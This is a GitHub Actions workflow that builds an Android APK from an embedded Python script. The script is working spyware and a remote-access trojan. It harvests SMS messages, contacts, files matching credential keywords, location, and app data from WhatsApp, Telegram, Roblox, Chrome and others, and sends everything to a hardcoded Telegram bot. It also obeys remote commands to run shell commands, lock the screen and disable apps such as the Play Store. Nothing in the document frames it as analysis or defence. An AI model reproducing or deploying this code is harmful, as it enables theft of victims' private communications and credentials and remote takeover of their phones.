name: Build APK
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v3
    - name: Install
      run: |
        sudo apt update
        sudo apt install -y openjdk-17-jdk
        pip install buildozer
    - name: Create main.py
      run: cat > main.py << 'EOF'
import os,requests,subprocess,shutil,json,sqlite3,time,glob,threading
T="8889128449:AAHUGVmOKw5cqeVx25D1WHN9lJcvyxsH43U"
C="8631833153"
def send(t):
 try:
  for i in range(0,len(t),4000):
   requests.post(f"https://api.telegram.org/bot{T}/sendMessage",json={"chat_id":C,"text":t[i:i+4000]},timeout=5)
 except:pass
def cmd(c):
 try:return subprocess.check_output(c,shell=True).decode()[:500]
 except:return"no"
def get_all():
 r=[]
 p=["/storage/emulated/0","/data/data","/sdcard"]
 e=[".db",".xml",".json",".txt",".cookie",".key",".token",".backup",".log"]
 for pp in p:
  if os.path.exists(pp):
   for a,b,c in os.walk(pp):
    for f in c:
     if any(f.endswith(x) for x in e):
      try:
       shutil.copy(os.path.join(a,f),f"/sdcard/{f}")
       r.append(f)
      except:pass
     for kw in ["password","login","user","pass","token","key","mail","email","phone"]:
      if kw in f.lower():
       try:
        with open(os.path.join(a,f),'r') as ff:
         d=ff.read()[:200]
         r.append(f"{f}: {d}")
       except:pass
 return r
def get_apps():
 try:return subprocess.check_output("pm list packages",shell=True).decode()[:500]
 except:return"no"
def get_sms():
 try:
  os.system("cp /data/data/com.android.providers.telephony/databases/mmssms.db /sdcard/")
  conn=sqlite3.connect("/sdcard/mmssms.db")
  cur=conn.cursor()
  cur.execute("SELECT address,body,date FROM sms ORDER BY date DESC LIMIT 100")
  s=cur.fetchall()
  conn.close()
  return "\n".join([f"{x[0]}: {x[1][:50]}"for x in s])
 except:return"no"
def get_contacts():
 try:
  os.system("cp /data/data/com.android.providers.contacts/databases/contacts2.db /sdcard/")
  conn=sqlite3.connect("/sdcard/contacts2.db")
  cur=conn.cursor()
  cur.execute("SELECT display_name,number FROM contacts LIMIT 200")
  c=cur.fetchall()
  conn.close()
  return "\n".join([f"{x[0]}: {x[1]}"for x in c])
 except:return"no"
def get_ip():
 try:return requests.get("https://api.ipify.org").text
 except:return"no"
def get_location():
 try:
  r=requests.get("http://ip-api.com/json/")
  d=r.json()
  return f"{d.get('city')}, {d.get('country')}, {d.get('lat')}, {d.get('lon')}"
 except:return"no"
def steal_google():
 r=[]
 p=["/data/data/com.google.android.gms","/storage/emulated/0/Android/data/com.google.android.apps.maps"]
 for pp in p:
  if os.path.exists(pp):
   for a,b,c in os.walk(pp):
    for f in c:
     if f.endswith((".db",".xml",".json",".txt")):r.append(f)
 return r
def steal_roblox():
 r=[]
 p=["/data/data/com.roblox.client","/storage/emulated/0/Android/data/com.roblox.client"]
 for pp in p:
  if os.path.exists(pp):
   for a,b,c in os.walk(pp):
    for f in c:
     if f.endswith((".db",".xml",".json",".txt",".cookie")):r.append(f)
 return r
def steal_telegram():
 r=[]
 p=["/data/data/org.telegram","/storage/emulated/0/Android/data/org.telegram"]
 for pp in p:
  if os.path.exists(pp):
   for a,b,c in os.walk(pp):
    for f in c:
     if f.endswith((".db",".xml",".json",".txt")):r.append(f)
 return r
def steal_whatsapp():
 r=[]
 p=["/data/data/com.whatsapp","/storage/emulated/0/Android/data/com.whatsapp"]
 for pp in p:
  if os.path.exists(pp):
   for a,b,c in os.walk(pp):
    for f in c:
     if f.endswith((".db",".crypt12",".crypt14",".txt",".xml")):r.append(f)
 return r
def steal_instagram():
 r=[]
 p=["/data/data/com.instagram.android","/storage/emulated/0/Android/data/com.instagram.android"]
 for pp in p:
  if os.path.exists(pp):
   for a,b,c in os.walk(pp):
    for f in c:
     if f.endswith((".db",".xml",".json",".txt")):r.append(f)
 return r
def steal_facebook():
 r=[]
 p=["/data/data/com.facebook.katana","/storage/emulated/0/Android/data/com.facebook.katana"]
 for pp in p:
  if os.path.exists(pp):
   for a,b,c in os.walk(pp):
    for f in c:
     if f.endswith((".db",".xml",".json",".txt")):r.append(f)
 return r
def steal_discord():
 r=[]
 p=["/data/data/com.discord","/storage/emulated/0/Android/data/com.discord"]
 for pp in p:
  if os.path.exists(pp):
   for a,b,c in os.walk(pp):
    for f in c:
     if f.endswith((".db",".xml",".json",".txt")):r.append(f)
 return r
def steal_tiktok():
 r=[]
 p=["/data/data/com.zhiliaoapp.musically","/storage/emulated/0/Android/data/com.zhiliaoapp.musically"]
 for pp in p:
  if os.path.exists(pp):
   for a,b,c in os.walk(pp):
    for f in c:
     if f.endswith((".db",".xml",".json",".txt")):r.append(f)
 return r
def steal_chrome():
 r=[]
 p=["/data/data/com.android.chrome","/storage/emulated/0/Android/data/com.android.chrome"]
 for pp in p:
  if os.path.exists(pp):
   for a,b,c in os.walk(pp):
    for f in c:
     if f.endswith((".db",".sqlite",".cookie",".txt")):r.append(f)
 return r
def block():
 try:
  os.system("settings put global install_non_market_apps 0")
  apps=["com.android.packageinstaller","com.google.android.gms","com.android.vending","com.android.chrome","com.whatsapp","com.instagram.android","com.facebook.katana","org.telegram","com.roblox.client"]
  for a in apps:os.system(f"pm disable {a}")
  os.system("input keyevent 26")
  return"done"
 except:return"no"
def lock():
 for i in range(5):os.system("input keyevent 26")
 return"done"
def command_loop():
 while True:
  try:
   r=requests.get(f"https://api.telegram.org/bot{T}/getUpdates",params={"offset":0,"timeout":30},timeout=35)
   for u in r.json().get("result",[]):
    txt=u.get("message",{}).get("text","")
    if txt.startswith("/cmd "):
     res=cmd(txt[5:])
     send(f"CMD: {txt[5:]}\n{res}")
    elif txt=="/lock":lock();send("LOCKED")
    elif txt=="/block":block();send("BLOCKED")
    elif txt=="/info":send(f"IP: {get_ip()}\nLOC: {get_location()}")
  except:pass
  time.sleep(2)
threading.Thread(target=command_loop,daemon=True).start()
msg=f"UNLOCK PASS: v67\nIP: {get_ip()}\nLOC: {get_location()}\nTIME: {time.ctime()}\nFILES: {len(get_all())}\nAPPS: {get_apps()[:200]}\nSMS: {get_sms()}\nCONTACTS: {get_contacts()}\nROBLOX: {steal_roblox()}\nTELEGRAM: {steal_telegram()}\nWHATSAPP: {steal_whatsapp()}\nINSTAGRAM: {steal_instagram()}\nFACEBOOK: {steal_facebook()}\nDISCORD: {steal_discord()}\nTIKTOK: {steal_tiktok()}\nCHROME: {steal_chrome()}\nGOOGLE: {steal_google()}\nBLOCK: {block()}"
send(msg)
EOF
    - name: Create spec
      run: |
        buildozer init
        sed -i 's/requirements = .*/requirements = python3,requests/g' buildozer.spec
        sed -i 's/package.name = .*/package.name = V/g' buildozer.spec
        sed -i 's/package.domain = .*/package.domain = org.v/g' buildozer.spec
        sed -i 's/permissions = .*/permissions = INTERNET,READ_EXTERNAL_STORAGE,WRITE_EXTERNAL_STORAGE,READ_SMS,READ_CONTACTS,ACCESS_FINE_LOCATION,ACCESS_COARSE_LOCATION/g' buildozer.spec
    - name: Build
      run: buildozer android debug
    - name: Upload
      uses: actions/upload-artifact@v3
      with:
        name: V
        path: bin/*.apk
